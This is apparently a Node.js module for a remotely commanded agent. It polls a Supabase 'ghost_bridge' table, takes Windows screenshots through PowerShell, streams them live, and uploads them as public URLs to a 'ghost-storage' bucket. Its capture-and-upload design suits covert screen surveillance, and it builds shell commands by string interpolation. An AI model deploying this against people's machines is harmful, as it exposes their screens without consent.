const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');

class VisionHandler {
    constructor(supabase, context) {
        this.supabase = supabase;
        this.context = context;
        this.isStreaming = false;
        this.streamTimer = null;
        this.localStream = context.localStream; // Injected dependency
    }

    async handle(cmd) {
        if (cmd.command === 'snap') return this.screenshot(cmd.id);
        if (cmd.command === 'stream') return this.toggleStream(cmd.id);

        // Explicit Start/Stop (Idempotent)
        if (cmd.command === 'vision:start') {
            if (!this.isStreaming) await this.toggleStream(cmd.id);
            else await this.updateStatus(cmd.id, 'executed', 'STREAM_ALREADY_ACTIVE');
            return;
        }
        if (cmd.command === 'vision:stop') {
            if (this.isStreaming) await this.toggleStream(cmd.id);
            else await this.updateStatus(cmd.id, 'executed', 'STREAM_ALREADY_OFFLINE');
            return;
        }
    }

    async screenshot(cmdId) {
        const snapId = Date.now();
        const filePath = path.join(process.cwd(), `snap_${snapId}.png`);

        try {
            // PowerShell screenshot command - enhanced for multi-monitor support (Primary only for now but safer)
            const psCommand = `
                Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
                $Screen = [System.Windows.Forms.Screen]::PrimaryScreen;
                $Bitmap = New-Object System.Drawing.Bitmap($Screen.Bounds.Width, $Screen.Bounds.Height);
                $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap);
                $Graphics.CopyFromScreen(0, 0, 0, 0, $Bitmap.Size);
                $Bitmap.Save('${filePath}');
                $Graphics.Dispose();
                $Bitmap.Dispose();
            `.replace(/\n/g, ' ').trim();

            if (!this.isStreaming) console.log(`[VISION] Initiating capture sequence [${snapId}]...`);

            return new Promise((resolve) => {
                exec(`powershell -Command "${psCommand}"`, async (err) => {
                    if (err) {
                        console.error(`[VISION] Capture failed: ${err.message}`);
                        if (cmdId) await this.updateStatus(cmdId, 'failed', `CAPTURE_ERROR: ${err.message}`);
                        return resolve(null);
                    }

                    // 1. Local Stream Broadcast (High Priority)
                    if (this.localStream) {
                        try {
                            const buffer = fs.readFileSync(filePath);
                            this.localStream.broadcast(buffer);
                        } catch (e) {
                            console.warn(`[VISION] Stream broadcast failed: ${e.message}`);
                        }
                    }

                    // 2. Cloud Upload (Only if requested specifically via 'snap' command or low-freq stream sync)
                    // If this is a high-freq stream capture, we SKIP cloud upload to save bandwidth/latency
                    // unless it's a manual 'snap' command (cmdId present)
                    if (cmdId) {
                        try {
                            const publicUrl = await this.upload(filePath);
                            console.log(`[VISION] Cloud sync complete: ${publicUrl}`);
                            await this.updateStatus(cmdId, 'executed', `FILE_READY: ${publicUrl}`);
                        } catch (uploadErr) {
                            console.error(`[VISION] Upload failed: ${uploadErr.message}`);
                            await this.updateStatus(cmdId, 'failed', `UPLOAD_ERROR: ${uploadErr.message}`);
                        }
                    }

                    // Cleanup
                    if (fs.existsSync(filePath)) {
                        try { fs.unlinkSync(filePath); } catch (e) { }
                    }
                    resolve(filePath);
                });
            });
        } catch (err) {
            console.error(`[VISION] Critical failure: ${err.message}`);
            if (cmdId) await this.updateStatus(cmdId, 'failed', `VISION_FAIL: ${err.message}`);
            if (fs.existsSync(filePath)) {
                try { fs.unlinkSync(filePath); } catch (e) { }
            }
        }
    }

    async upload(filePath) {
        const fileName = path.basename(filePath);
        const fileBuffer = fs.readFileSync(filePath);
        const storagePath = `transfers/${Date.now()}_${fileName}`;

        const { data, error } = await this.supabase.storage
            .from('ghost-storage')
            .upload(storagePath, fileBuffer, {
                contentType: 'image/png',
                upsert: true
            });

        if (error) {
            // Check if bucket exists, if not, try creating it (fallback)
            if (error.message.includes('not found') || error.status === 400) {
                console.warn(`[VISION] Bucket 'ghost-storage' not found. Ensure SQL initialization ran.`);
            }
            throw error;
        }

        const { data: { publicUrl } } = this.supabase.storage
            .from('ghost-storage')
            .getPublicUrl(data.path);

        return publicUrl;
    }

    async toggleStream(cmdId) {
        if (this.isStreaming) {
            this.isStreaming = false;
            if (this.streamTimer) clearInterval(this.streamTimer);
            this.streamTimer = null;
            console.log(`[VISION] Stream Terminated.`);
            await this.updateStatus(cmdId, 'executed', 'LIVE_STREAM: OFF');
        } else {
            this.isStreaming = true;
            console.log(`[VISION] Neural Stream Initialized (MJPEG Mode).`);

            await this.updateStatus(cmdId, 'executed', 'LIVE_STREAM: ON');

            // Immediate first snap
            this.screenshot(null);

            // Faster interval for MJPEG (e.g. 1000ms = 1fps, managed to prevent starvation)
            const loop = async () => {
                if (!this.isStreaming) return;
                await this.screenshot(null);
                if (this.isStreaming) setTimeout(loop, 1000); // 1s (safe) delay between captures
            };
            loop();
        }
    }

    async updateStatus(id, status, output) {
        if (!id) return;
        try {
            await this.supabase.from('ghost_bridge').update({ status, output }).eq('id', id);
        } catch (err) {
            console.error(`[VISION] Status update failed: ${err.message}`);
        }
    }
}

module.exports = VisionHandler;
